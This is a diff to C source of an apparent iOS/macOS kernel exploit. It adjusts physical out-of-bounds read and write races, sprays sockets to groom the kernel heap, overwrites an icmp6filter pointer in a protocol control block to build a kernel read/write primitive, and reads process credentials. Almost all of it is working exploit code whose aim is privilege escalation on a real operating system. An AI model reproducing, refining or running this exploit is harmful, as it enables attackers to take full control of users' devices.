@@ -451,7 +451,6 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t me
 	int w = 0;
 	for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {
 		totalAttempts++;
-		*(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;
 		raceSync = 1;
 		errno = 0;
 		w = pwritev(readFd, &iov, 1, 0x3f00);
@@ -542,10 +541,6 @@ void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObje
 	iov.iov_base = (void *)(pcAddress + 0x3f00);
 	iov.iov_len = offset + size;
 
-	// zero the file prefix at 0x3f00-0x3fff so old OOB read data doesn't
-	// corrupt the end of the first physical page during the preadv race
-	uint8_t zero_prefix[0x100] = {0};
-	pwrite(writeFd, zero_prefix, sizeof(zero_prefix), 0x3f00);
 	ssize_t pw = pwrite(writeFd, buffer, size, 0x3f00 + offset);
 	if (pw < 0) {
 		printf("[-] pwrite failed: errno=%d\n", errno);
@@ -695,14 +690,14 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		rwSocketPcb = inpListNextPointer;
 		memcpy(writeBuffer, readBuffer, OOB_SIZE);
 		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;
+		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8) = 0;
 
 		printf("[+] Corrupting icmp6filter pointer...\n");
 		// write only enough to cover target PCB — the OOB read is non-atomic
 		// (race captures a mix of randomMarker and real data), so collateral PCBs
 		// in the writeBuffer may contain randomMarker at their icmp6filt offset.
 		// writing those back corrupts their filter pointers → zone_require panic.
-		// write ONLY up to and including the 8-byte filter pointer — minimize footprint
-		mach_vm_size_t writeSize = pcbStartOffset + OFFSET_ICMP6FILT + 8;
+		mach_vm_size_t writeSize = pcbStartOffset + OFFSET_ICMP6FILT + 0x10;
 		if (writeSize > OOB_SIZE) writeSize = OOB_SIZE;
 		while (true) {
 			physical_oob_write_mo(memoryObject, seekingOffset, writeSize, OOB_OFFSET, writeBuffer);
@@ -721,29 +716,9 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		}
 		printf("[+] controlSocket idx=%d fd=%d, rwSocket fd=%d\n", controlSocketIdx, controlSocket, rwSocket);
 		fflush(stdout);
-
-		memset(controlData, 0, EARLY_KRW_LENGTH);
-		*(uint64_t *)controlData = rwSocketPcb + OFFSET_PCB_LIST_NEXT;
-		if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0) {
-			printf("[-] KRW validation: setsockopt failed, retrying\n"); fflush(stdout);
-			// don't close — corrupted filter would panic on rip6_detach
-			controlSocket = 0; rwSocket = 0;
-			return -1;
-		}
-		uint8_t vbuf[EARLY_KRW_LENGTH];
-		socklen_t vlen = EARLY_KRW_LENGTH;
-		if (getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, vbuf, &vlen) != 0) {
-			printf("[-] KRW validation: getsockopt failed, retrying\n"); fflush(stdout);
-			controlSocket = 0; rwSocket = 0;
-			return -1;
-		}
-		controlSocketPcb = __xpaci(*(uint64_t *)vbuf);
-		if ((controlSocketPcb >> 56) != 0xff || controlSocketPcb == (uint64_t)-1) {
-			printf("[-] KRW validation: controlSocketPcb=%#llx bad, retrying\n", controlSocketPcb); fflush(stdout);
-			controlSocket = 0; rwSocket = 0;
-			return -1;
-		}
-		printf("[i] controlSocketPcb=%#llx (validated)\n", controlSocketPcb); fflush(stdout);
+		// read controlSocketPcb NOW while inp_list is intact (sockets_release will tear it down)
+		controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
+		printf("[i] controlSocketPcb=%#llx\n", controlSocketPcb); fflush(stdout);
 		return KERN_SUCCESS;
 	}
 	return -1;
@@ -805,8 +780,8 @@ void pe_v1(void)
 		u64_array_reset(&socketPcbIds);
 		unsigned socketPortsCount = 0;
 		#define OPEN_MAX 10240
-		int maxfiles = OPEN_MAX;
-		int leeway = 2048;
+		int maxfiles = OPEN_MAX * 3;
+		int leeway = 4096 * 2;
 		for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
 			mach_port_t port = spray_socket(&socketPorts);
 			if (port == -1) {
@@ -850,7 +825,7 @@ void pe_v1(void)
 				break;
 			}
 		}
-		if (!success) sockets_release(&socketPorts);
+		sockets_release(&socketPorts);
 		for (uint64_t s = 0; s < searchMappingNum; s++) {
 			mach_vm_address_t searchMappingAddress = u64_array_last(&searchMappings);
 			u64_array_pop(&searchMappings);
@@ -881,9 +856,8 @@ void krw_sockets_leak_forever(void)
 	uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
 	printf("[i] krw: rwSocketAddr = %#llx\n", rwSocketAddr);
 
-	if (!controlSocketAddr || !rwSocketAddr ||
-	    (controlSocketAddr >> 56) != 0xff || (rwSocketAddr >> 56) != 0xff) {
-		printf("[-] Bad socket addrs: control=%#llx rw=%#llx\n", controlSocketAddr, rwSocketAddr);
+	if (!controlSocketAddr || !rwSocketAddr) {
+		printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
 		FAILURE(0);
 	}
 
@@ -942,8 +916,8 @@ int main(int argc, char* argv[])
 	// controlSocketPcb already read inside find_and_corrupt_socket (before sockets_release)
 	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);
 
-	// sockets stay alive via port refs (no sockets_release on success path)
-	// skip krw_sockets_leak_forever — not needed without release
+	krw_sockets_leak_forever();
+	printf("[+] sockets leaked\n"); fflush(stdout);
 
 	uint64_t socketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
 	uint64_t ucred = early_kread64(socketAddr + OFFSET_SO_CRED);
@@ -1028,6 +1002,6 @@ int main(int argc, char* argv[])
 		closedir(dir);
 	}
 
-	printf("[*] DONE — sleeping to keep sockets alive\n"); fflush(stdout);
-	while (1) sleep(3600);
+	printf("[*] DONE\n"); fflush(stdout);
+	return 0;
 }
